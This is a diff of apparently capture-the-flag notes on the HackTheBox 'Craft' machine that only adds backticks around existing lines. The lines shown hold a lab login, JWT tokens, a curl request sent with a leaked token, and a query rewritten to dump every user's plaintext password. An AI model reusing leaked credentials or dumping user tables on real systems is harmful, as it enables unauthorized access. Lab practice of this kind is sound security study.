@@ -44,7 +44,7 @@ auth=('dinesh', '4aUh0A8PbVJxgd')
 
 Try in /auth/login...
 
-{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTc0MzcxMDExfQ.hbUYCLi6US-Ka911usBo9BL4C5p87VRQAKx3jv9CJsM"}
+`{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTc0MzcxMDExfQ.hbUYCLi6US-Ka911usBo9BL4C5p87VRQAKx3jv9CJsM"}`
 
 https://api.craft.htb/api/auth/check makes sure token is valid...
 
@@ -52,7 +52,7 @@ Can use login page to login as dinesh.
 
 https://gogs.craft.htb/Craft/craft-api/issues/2
 
-curl -H 'X-Craft-API-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw' -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data '{"name":"bullshit","brewer":"bullshit", "style": "bullshit", "abv": "15.0")}'
+`curl -H 'X-Craft-API-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw' -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data '{"name":"bullshit","brewer":"bullshit", "style": "bullshit", "abv": "15.0")}'`
 
 could use token from earlier??
 
@@ -100,7 +100,7 @@ sql = "SELECT *FROM user" {'id': 1, 'username': 'dinesh', 'password': '4aUh0A8Pb
 
 result = cursor.fetchone() --> result = cursor.fetchall()
 
-[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]
+`[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]`
 
 log in to gogs as gilfoyle
 
